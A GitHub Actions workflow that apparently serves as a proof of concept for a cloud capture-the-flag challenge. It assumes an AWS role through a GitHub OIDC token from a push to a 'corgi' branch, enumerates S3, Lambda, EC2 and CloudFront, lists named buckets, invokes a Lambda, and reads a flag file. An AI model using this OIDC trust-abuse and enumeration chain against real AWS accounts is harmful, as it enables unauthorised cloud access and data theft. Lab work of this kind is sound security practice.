name: cloudescape-oidc-poc

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  assume-role:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Confirm identity
        run: aws sts get-caller-identity

      - name: Enumerate S3 buckets
        run: aws s3 ls
        continue-on-error: true

      - name: Enumerate Lambda functions
        run: aws lambda list-functions
        continue-on-error: true

      - name: Enumerate EC2 instances
        run: aws ec2 describe-instances --region us-east-1
        continue-on-error: true

      - name: Enumerate CloudFront distributions
        run: aws cloudfront list-distributions
        continue-on-error: true

      - name: List codec bucket
        run: aws s3 ls s3://codec4f26c862a321ef5/ --recursive
        continue-on-error: true

      - name: List site bucket
        run: aws s3 ls s3://site781fe43f26b9eba3/ --recursive
        continue-on-error: true

      - name: Get Lambda function URL config
        run: aws lambda get-function-url-config --function-name nslookupv2
        continue-on-error: true

      - name: Get Lambda resource policy
        run: aws lambda get-policy --function-name nslookupv2
        continue-on-error: true

      - name: Try invoking Lambda directly
        run: |
          aws lambda invoke --function-name nslookupv2 \
            --payload '{"domain":"example.com"}' \
            --cli-binary-format raw-in-base64-out \
            output.json
          cat output.json
        continue-on-error: true
        
      - name: Read the flag
        run: aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 
        continue-on-error: true